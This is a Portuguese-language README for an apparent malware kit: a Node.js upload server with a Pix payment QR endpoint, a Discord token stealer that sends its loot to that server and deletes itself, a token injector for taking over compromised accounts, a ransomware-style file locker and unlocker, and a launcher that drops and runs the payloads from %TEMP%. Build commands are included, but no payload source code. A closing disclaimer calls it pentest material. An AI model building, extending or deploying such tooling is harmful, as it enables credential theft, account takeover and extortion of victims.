# Projeto Download & Builder Mestre

Este repositório contém uma infraestrutura modular composta por um servidor web para recebimento e gerenciamento de arquivos, uma suite de ferramentas em C++ para Windows (incluindo coletores, injetores e criptografadores de arquivos), além de um ambiente de compilação automatizado via PowerShell e Docker.

---

## 📁 Estrutura do Projeto

```text
donw/
├── .env                  # Configurações de ambiente (Porta, Pix, URLs)
├── .env.example          # Exemplo de variáveis de ambiente
├── Dockerfile            # Imagem de compilação (Powershell + MinGW-w64 + 7-Zip)
├── server.js             # Servidor Backend em Node.js (Express + Multer)
├── package.json          # Dependências do backend
├── public/
│   └── index.html        # Interface Web para upload/download de arquivos
├── uploads/              # Pasta destino de arquivos recebidos
├── builder/
│   └── build.ps1         # Script Mestre de Compilação e Empacotamento
└── collector_discord/    # Suite de ferramentas em C++
    ├── build.ps1         # Script de compilação do Terror (Stealer)
    ├── collector/        # Módulo de coleta de tokens Discord
    │   ├── build.ps1     # Script de compilação do Collector
    │   └── README.md     # Documentação interna do Collector
    └── crip/             # Módulo de criptografia de arquivos
        └── build.ps1     # Script de compilação do Criptografador/Descriptografador
```

---

## 🛠️ Tecnologias Utilizadas

### Servidor Web (Backend)
* **Node.js** com **Express**
* **Multer** (upload de arquivos em multipart/form-data)
* **qrcode** (geração dinâmica de QR Code Pix no formato EMV Co)
* **dotenv** (gerenciamento de variáveis de ambiente)

### Ambiente de Compilação & Ferramentas
* **PowerShell (pwsh)**
* **GCC / MinGW-w64** (compilação nativa e cross-compilação para Windows)
* **MSVC (cl.exe / vcvars64)** (suporte opcional de compilação local no Windows)
* **7-Zip / 7z** (compactação e segurança dos arquivos binários gerados)
* **Docker** (para isolamento e execução do compilador mestre em qualquer SO)

---

## 🚀 Como Executar

### 1. Servidor de Gerenciamento de Arquivos e Pix

O servidor backend roda na porta padrão `3000` (ou definida no `.env`) e provê uma API REST básica além de uma interface web simples.

#### Configuração das Variáveis de Ambiente
Copie o arquivo de exemplo `.env.example` para `.env` e configure conforme sua necessidade:
```bash
cp .env.example .env
```
Campos no `.env`:
* `PORT`: Porta de execução (padrão: 3000)
* `DOMAIN_SERVER`: URL completa do servidor backend (ex: `http://localhost:3000` ou `https://meudominio.com`)
* `PIX_KEY`: Chave Pix utilizada para gerar o QR Code.
* `PIX_NAME`: Nome do beneficiário do Pix.
* `PIX_CITY`: Cidade do beneficiário.
* `PIX_PAYLOAD`: Payload Pix bruto (caso deseje sobrepor a geração dinâmica).

#### Instalação e Inicialização
```bash
npm install
npm start
```
Acesse `http://localhost:3000` para visualizar a interface web de uploads/downloads.

#### Endpoints Principais
* `POST /profile`: Envia um único arquivo para a pasta `uploads/`.
* `POST /photos/upload`: Envia múltiplos arquivos para a pasta `uploads/`.
* `GET /files`: Retorna a lista de arquivos presentes na pasta `uploads/`.
* `GET /download/:filename`: Realiza o download de um arquivo específico.
* `GET /qrCode`: Retorna uma imagem PNG contendo o QR Code Pix dinâmico/estático configurado.

---

### 2. Compilação das Ferramentas (Builder Mestre)

O script `builder/build.ps1` é o coordenador mestre de compilação. Ele busca recursivamente scripts `build.ps1` nos submódulos, executa a compilação de cada um, centraliza os executáveis e cria um **Launcher Paralelo Mestre** (`launcher.exe`).

#### O que o Launcher Mestre faz:
1. Extrai todos os binários utilitários embutidos para a pasta temporária do Windows (`%TEMP%`).
2. Executa todos os payloads em paralelo de forma assíncrona.
3. Aguarda a finalização dos processos.
4. Remove os resíduos temporários do disco após a execução.

#### Compilação Local (Windows)
Certifique-se de ter `g++` (MinGW) ou as ferramentas do Visual Studio (MSVC) instaladas e execute no PowerShell:
```powershell
.\builder\build.ps1 -OutputName "launcher"
```

#### Compilação com Docker (Recomendado / Multiplataforma)
Construa e execute o container de compilação. O Dockerfile usa o cross-compilador `mingw-w64` sob o Linux:

1. **Build da Imagem**:
   ```bash
   docker build -t windows-builder .
   ```
2. **Execução da Compilação**:
   ```bash
   docker run -it --rm -v "${pwd}:/workspace" windows-builder
   ```
   Os binários gerados serão gravados na pasta `builder/` na sua máquina local.

---

## 📦 Detalhes dos Submódulos (`collector_discord/`)

### 1. `collector_discord` (Stealer Principal - `terror.exe`)
Coleta tokens do Discord a partir dos bancos de dados LevelDB locais, informações detalhadas sobre o hardware do computador alvo e geolocalização por IP. Salva em um arquivo `.zip`, realiza o upload para o servidor backend (`POST /profile`) e se exclui.

### 2. `collector_discord/collector` (Injetor de Conta - `discord_launcher.exe`)
Uma ferramenta utilizada pela pessoa que realizou o pentest para facilitar o acesso à conta comprometida.
Ao ser alimentado com o arquivo `discord.txt` gerado pelo stealer, ele abre o Microsoft Edge e usa simulação de teclado em nível de kernel (`SendInput`) no DevTools para injetar o token no `localStorage` do Discord, efetuando o login imediato na conta.

### 3. `collector_discord/crip` (Locker de Arquivos - `locker.exe` e `unlocker.exe`)
Uma ferramenta de criptografia simétrica multi-threaded que utiliza criptografia de chave de fluxo rápida com chaves geradas por AES-256 e APIs nativas do Windows (`bcrypt.dll`).
* **locker.exe**: Criptografa arquivos em diretórios configurados.
* **unlocker.exe**: Reverte o processo caso a senha embutida no cabeçalho ou nas variáveis corresponda.
Ambos são empacotados pelo script de build local num arquivo criptografado `release.zip` com senha.

---

## ⚠️ Aviso Legal

> **IMPORTANTE**: Este repositório e as ferramentas nele contidas foram desenvolvidos estritamente para fins acadêmicos, educacionais e de testes de intrusão autorizados (Pentest). 
> O uso destas ferramentas em sistemas sem consentimento prévio e por escrito do proprietário é estritamente proibido e pode violar leis locais de segurança da informação. Os desenvolvedores não assumem qualquer responsabilidade por eventuais danos causados pelo uso indevido das ferramentas.
